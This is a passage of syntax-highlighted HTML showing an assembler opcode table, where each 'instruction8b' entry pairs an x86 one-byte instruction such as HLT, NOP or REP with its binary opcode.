 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">DAS</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00101111b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">HLT</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11110100b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">INSB</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01101100b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">INSD</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01101101b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">INT3</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11001100b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">INTO</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11001110b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">IRETD</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11001111b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">LAHF</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10011111b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">LEAVE</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11001001b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">LODSB</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10101100b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">LODSD</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10101101b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">MOVSB</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10100100b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">MOVSD</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10100101b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">NOP</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10010000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">OUTSB</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01101110b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">OUTSD</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01101111b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">POPAD</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01100001b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">POPFD</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10011101b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">PUSHAD</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01100000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">PUSHFD</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10011100b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">SALC</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11010110b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">SAHF</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10011110b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">SCASB</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10101110b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">SCASD</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10101111b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">STC</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11111001b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">STD</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11111101b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">STI</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11111011b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">STOSB</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10101010b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">STOSD</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10101011b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">WAIT</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10011011b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">XLAT</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11010111b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">LOCK</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11110000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11110011b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">REPNZ</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11110010b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 

